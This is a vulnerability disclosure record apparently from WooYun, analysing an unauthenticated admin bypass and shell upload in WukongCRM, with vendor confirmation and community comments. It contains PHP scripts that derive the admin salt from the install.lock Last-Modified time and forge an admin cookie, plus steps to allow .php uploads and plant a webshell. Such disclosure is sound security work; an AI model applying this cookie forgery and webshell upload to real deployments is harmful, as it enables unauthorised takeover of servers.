{"id": 88462, "wybug_id": "wooyun-2016-0193223", "wybug_title": "悟空CRM从无任何权限到Getshell漏洞分析                                      ", "wybug_corp": "郑州卡卡罗特软件科技有限公司", "wybug_author": "phith0n", "wybug_date": "2016-04-06 18:47", "wybug_open_date": "2016-07-07 16:30", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-07：\t细节向公众公开  简要描述： 这是一个无需账户的getshell。此漏洞专为打某人脸，哈哈~ 附带一个判断某某的小技巧，较实用。 详细说明：  悟空CRM大部分功能是需要登录，登录以后的漏洞比较鸡肋，那么我发一个越权，从无任意权限到拿下管理员权限，到getshell。看到检查权限的类 App/Lib/Behavior/AuthenticateBehavior.class.php：\nclass AuthenticateBehavior extends Behavior {\tprotected $options = array();\t\tpublic function run(&$params) {\t\t$m = MODULE_NAME;\t\t$a = ACTION_NAME;\t\t$allow = $params['allow'];\t\t$permission = $params['permission'];\t\t\t\tif(!session('?user_id') && intval(cookie('user_id')) != 0 && trim(cookie('name')) != '' && trim(cookie('salt_code')) != ''){\t\t\t$user = M('user')->where(array('user_id' => intval(cookie('user_id'))))->find();\t\t\tif (md5(md5($user['user_id'] . $user['name']).$user['salt']) == trim(cookie('salt_code'))) {\t\t\t\t$d_role = D('RoleView');\t\t\t\t$role = $d_role->where('user.user_id = %d', $user['user_id'])->find();\t\t\t\tif($user['category_id'] == 1){\t\t\t\t\tsession('admin', 1);\t\t\t\t}\t\t\t\tsession('role_id', $role['role_id']);\t\t\t\tsession('position_id', $role['position_id']);\t\t\t\tsession('role_name', $role['role_name']);\t\t\t\tsession('department_id', $role['department_id']);\t\t\t\tsession('name', $user['name']);\t\t\t\tsession('user_id', $user['user_id']);\t\t\t}\t\t}\t\t\t\tif (session('?admin')) {\t\t\treturn true;\t\t}\t\tif (in_array($a, $permission)) {\t\t\treturn true;\t\t} elseif (session('?position_id') && session('?role_id')) {                        ...\n看到这里：if (md5(md5($user['user_id'] . $user['name']).$user['salt']) == trim(cookie('salt_code')))这里，如果cookie salt_code正确的话，将设置session，可以导致权限的绕过。那么这个if语句，我们看看有哪些值是不知道的。以管理员为例：$user['user_id'] ： 已知，为1$user['name'] ： 已知，为admin$user['salt'] ： 未知cookie('salt_code') ：已知，为我传入的cookie那么，实际上这个if语句只有一个参数是未知的，那就是salt。我们看看salt是怎么生成的：/App/Lib/Action/InstallAction.class.php 216行：\n$salt = substr(md5(time()),0,4);$password = md5(md5(trim($password)) . $salt);$db->query('insert into ' . C('DB_PREFIX') . 'user (role_id, category_id, status, name, password, salt, reg_ip, reg_time) values (1, 1, 1, \"'.$name.'\", \"'.$password.'\", \"'.$salt.'\", \"'.get_client_ip().'\", '.time().')'); touch(CONF_PATH . \"install.lock\");\n可见：$salt = substr(md5(time()),0,4);salt只和time()有关的，也就是说，只要知道了安装的时候的时间，就可以知道管理员的salt。那么，如何知道安装的时间呢？1.跑，猜测。这个方法也不是完全不可行，但明显不优雅。2.通过Last-Modified得知这里2就是我要说的小技巧。在HTTP协议里，当我们请求一些静态文件的时候，服务器默认会将这个文件的修改时间作为Last-Modified这个头的值返回。那么我们看到以上代码的最后一行touch(CONF_PATH . \"install.lock\");这里创建了一个install.lock文件，我们请求一下这个文件看看：\n\n这里果然返回了一个时间，我写了个小脚本，来计算管理员的salt：\n<?phpdate_default_timezone_set('UTC');$time = strtotime('Tue, 05 Apr 2016 03:40:28 GMT');$salt = substr(md5($time),0,4);echo $salt;\n将Last-Modified的值填入strtotime函数，即可计算当时的时间戳，进而计算salt：\n\n看看是否计算正确：\n\n妥妥正确。我再通过salt生成一个cookie：\n<?phpdate_default_timezone_set('UTC');$time = strtotime('Tue, 05 Apr 2016 03:40:28 GMT');$salt = substr(md5($time),0,4);echo $salt;echo \"\\n\";$user_id = 1;$name = 'admin';$cookie = md5(md5($user_id . $name).$salt);echo \"user_id=1; name=admin; salt_code={$cookie};\";echo \"\\n\";\n\n\n将这个cookie填入HTTP数据包：\n\n即可作为管理员访问悟空crm。然后，修改上传允许的后缀，加个php即可：\n\n来到合同处（ **.**.**.**/wukongcrm/index.php?m=contract&a=add ），在编辑器里上传shell：\n\n\n\n拿下！\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-04-08 16:22 厂商回复： 谢谢关注，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-06 18:48 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  屌啊！    \n     2016-04-06 18:55 |    \t\tloopx9  \t\t\t( 普通白帽子  |\t\t\t        Rank:829 漏洞数:85        | ..)\t\t \n  p师傅!    \n     2016-04-06 19:02 |    \t\t云之凡 \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:30        | just do it)\t\t \n  牛逼哄哄    \n     2016-04-06 19:06 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1415 漏洞数:157        | 乌云核心菜鸟，此号长期由联盟托管，如果近...)\t\t \n  p牛    \n     2016-04-06 19:10 |    \t\t苏安泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:55        | 一个想成为演员的黑客~)\t\t \n  好不容易在P牛这里留个5L    \n     2016-04-06 19:14 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这是在打谁的脸？    \n     2016-04-06 19:18 |    \t\tcode001 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | 爱生活，爱自由，希冀一个更加安全开放的互...)\t\t \n  官方后面？    \n     2016-04-06 19:29 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:834 漏洞数:127        | 一个想当文人的黑客~)\t\t \n  @疯狗 我师父L.N. 他说挖不出来    \n     2016-04-06 19:30 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  p师傅!    \n     2016-04-06 19:51 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  有点意思，学了一招    \n     2016-04-06 20:18 |    \t\t田老板 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:14        | 学校杀手)\t\t \n  有点意思，学了一招    \n     2016-04-06 20:20 |    \t\tCoody  \t\t\t( 普通白帽子  |\t\t\t        Rank:1809 漏洞数:214        | 不接单、不黑产；如遇冒名顶替接单收徒、绝...)\t\t \n  楼上的、你们这样好么？我们得等到儿童节才能看到详情。    \n     2016-04-06 21:26 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:72        )\t\t \n  66666    \n     2016-04-07 08:36 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:58        | 提莫队长正在待命！)\t\t \n  .    \n     2016-04-08 16:38 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  66666    \n     2016-04-08 17:19 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:834 漏洞数:127        | 一个想当文人的黑客~)\t\t \n  rank有点低呀。。。要不多挖几个    \n     2016-04-08 17:39 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1922 漏洞数:305        | 最近有人冒充该账号行骗，任何自称HackBrai...)\t\t \n   我师父L.N. 他说挖不出来，啪啪啪打脸    \n     2016-04-11 17:54 |    \t\t未了 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        )\t\t \n  快点公开    \n     2016-04-12 15:17 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:486 漏洞数:107        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  @召唤神兽  出来吧关注还有留言的朋友们！    \n     2016-04-15 12:59 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  666    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}